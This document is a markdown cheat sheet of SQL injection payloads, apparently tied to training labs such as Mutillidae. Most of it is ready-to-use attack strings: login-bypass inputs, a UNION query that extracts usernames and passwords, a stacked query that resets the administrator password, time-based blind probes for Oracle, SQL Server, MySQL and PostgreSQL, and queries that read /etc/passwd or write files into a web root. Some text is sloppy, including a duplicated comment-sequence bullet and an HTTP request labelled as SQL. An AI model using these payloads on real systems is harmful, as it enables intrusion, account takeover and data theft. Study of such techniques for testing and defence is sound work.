# SQL Injection Cheat Sheet

## Testing for Vulnerability

To determine if a web application is vulnerable to SQL injection, you can use the following payloads to analyze how the application processes SQL code:

- `'` : This single quote is used to terminate a string in SQL. If the application does not handle it properly, it can break the intended SQL query structure, leading to an error or unexpected behavior, indicating a potential vulnerability.
- `"` : Similar to the single quote, the double quote is used to terminate a string in SQL. If the application does not handle it properly, it can also break the SQL query structure, leading to an error or unexpected behavior.
- `--` : This sequence is used to comment out the rest of the SQL query. If the application does not properly handle input, using `--` can allow an attacker to ignore the rest of the query, potentially bypassing authentication or other checks.
- `--` : This is another comment sequence that can be used to ignore the rest of the SQL query. It functions similarly to the previous bullet point and can be used to bypass authentication or other checks if the application is vulnerable.


Example:
```sql
' OR '1'='1
```

## UNION-Based SQL Injection

To extract data from the database using UNION-based SQL injection, you can use the following query:

```sql
UNION SELECT username, password FROM users--
```

## Enumerating Tables

To enumerate tables in most databases, you can use the following query:

```sql
SELECT * FROM information_schema.tables
```

## Common SQL Injection Payloads

Here are some common SQL injection payloads that can be used to bypass login forms or extract data:

- `admin' --`
- `admin' #`
- `admin'/*`
- `' or 1=1--`
- `' or 1=1#`
- `' or 1=1/*`
- `') or '1'='1--`
- `') or ('1'='1--`

## SQL Injection in Login Forms

To exploit a login form, you can use the following payload:

```sql
examplename'; UPDATE users SET password='letmein' WHERE user='administrator'--
```

## Time-Based SQL Injection

### Testing for Time Delay

You can test for time delays to identify SQL injection vulnerabilities. Here are examples for different databases:

- **Oracle**:
```sql
dbms_pipe.receive_message(('a'),10)
```
- **Microsoft SQL Server**:
```sql
WAITFOR DELAY '0:0:10'
```
- **MySQL**:
```sql
SELECT sleep(10)
```
- **PostgreSQL**:
```sql
TrackingId=x'||pg_sleep(10)--
```

### Conditional Time Delays

You can test a single boolean condition and trigger a time delay if the condition is true:

- **Oracle**:
```sql
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual
```
- **Microsoft SQL Server**:
```sql
IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'
```
- **PostgreSQL**:
```sql
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END
```
- **MySQL**:
```sql
SELECT IF(YOUR-CONDITION-HERE, sleep(10), 'a')
```

## PostgreSQL Concatenation Example

To concatenate strings in PostgreSQL, you can use the following example:

```sql
GET /filter?category=Gifts'+UNION+SELECT+NULL,+Username+||+'*'+||+password+FROM+users-- HTTP/1.1
```

## Reading Files

To read files from the server using SQL injection, you can use the following query:

```sql
UNION SELECT NULL, load_file('/etc/passwd'), NULL, NULL, NULL#
```

Alternative format:
```sql
UNION+SELECT+NULL, load_file('/etc/passwd')--
```

## Uploading Files

To upload files to the server using SQL injection, you can use the following query:

```sql
UNION SELECT NULL, 'example example', NULL, NULL INTO OUTFILE '/var/www/mutillidae/example.txt'#
```

Alternative format:
```sql
UNION+SELECT+NULL, 'write1 example2'+INTO OUTFILE+'/var/www/mutillidae/example.txt'--
```